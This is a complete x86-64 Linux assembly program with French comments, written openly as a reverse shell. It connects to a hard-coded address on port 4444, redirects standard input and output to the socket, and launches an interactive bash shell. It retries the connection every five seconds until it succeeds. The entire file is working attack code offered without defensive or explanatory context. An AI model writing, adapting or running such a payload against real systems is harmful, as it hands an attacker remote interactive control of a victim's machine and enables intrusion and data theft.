section .data
TARGET_IP:
    dw 2                    ; AF_INET (2 bytes)
    dw 0x5c11               ; Port 4444 (network byte order)
    dd 0x936CA8C0           ; IP 192.168.108.147
    times 8 db 0            ; Padding

welcome_msg:
    db "--------------------------------------------------",0x0A
    db "|          BIENVENUE DANS LE REVERSE SHELL       |",0x0A
    db "--------------------------------------------------",0x0A
    db 0
welcome_len equ $ - welcome_msg

bash_path:
    db '/bin/bash',0

bash_arg:
    db '-i',0               ; Mode interactif

env_ps1:
    db 'PS1=\[\033[1;32m\]\w\[\033[0m\]\$ ',0  ; Prompt couleur
env_term:
    db 'TERM=xterm-256color',0
env_path:
    db 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',0

timespec:
    dd 5                    ; 5 secondes
    dd 0

section .text
global _start

_start:
    jmp main

main:
    call create_socket
    test rax, rax
    js error_handler
    
    call connect
    test rax, rax
    js reconnect_if_fail
    
    call redir_io
    call shell
    call exit

create_socket:
    mov rax, 41             ; sys_socket
    mov rdi, 2              ; AF_INET
    mov rsi, 1              ; SOCK_STREAM
    mov rdx, 0
    syscall
    mov r12, rax            ; Sauvegarde socket fd
    ret

connect:
    mov rax, 42             ; sys_connect
    mov rdi, r12
    lea rsi, [rel TARGET_IP]
    mov rdx, 16
    syscall
    ret

redir_io:
    mov rsi, 0              ; STDIN
redir_loop:
    mov rax, 33             ; sys_dup2
    mov rdi, r12
    mov rdx, rsi
    syscall
    inc rsi
    cmp rsi, 3
    jl redir_loop
    ret

shell:
    ; Affichage message d'accueil
    mov rax, 1              ; sys_write
    mov rdi, 1
    lea rsi, [rel welcome_msg]
    mov rdx, welcome_len
    syscall

    ; Construction environnement
    push 0                  ; NULL terminator
    lea rax, [rel env_path] ; PATH
    push rax
    lea rax, [rel env_term] ; TERM
    push rax
    lea rax, [rel env_ps1]  ; PS1
    push rax
    mov rdx, rsp            ; envp

    ; Construction arguments
    push 0                  ; argv[2] = NULL
    lea rax, [rel bash_arg] ; "-i"
    push rax                ; argv[1]
    lea rax, [rel bash_path]; "/bin/bash"
    push rax                ; argv[0]
    
    mov rdi, rax            ; path
    mov rsi, rsp            ; argv
    mov rax, 59             ; sys_execve
    syscall

error_handler:
    mov rax, 3              ; sys_close
    mov rdi, r12
    syscall

reconnect_if_fail:
    mov rax, 35             ; sys_nanosleep
    lea rdi, [rel timespec]
    xor rsi, rsi
    syscall
    jmp main

exit:
    mov rax, 60             ; sys_exit
    xor rdi, rdi
    syscall
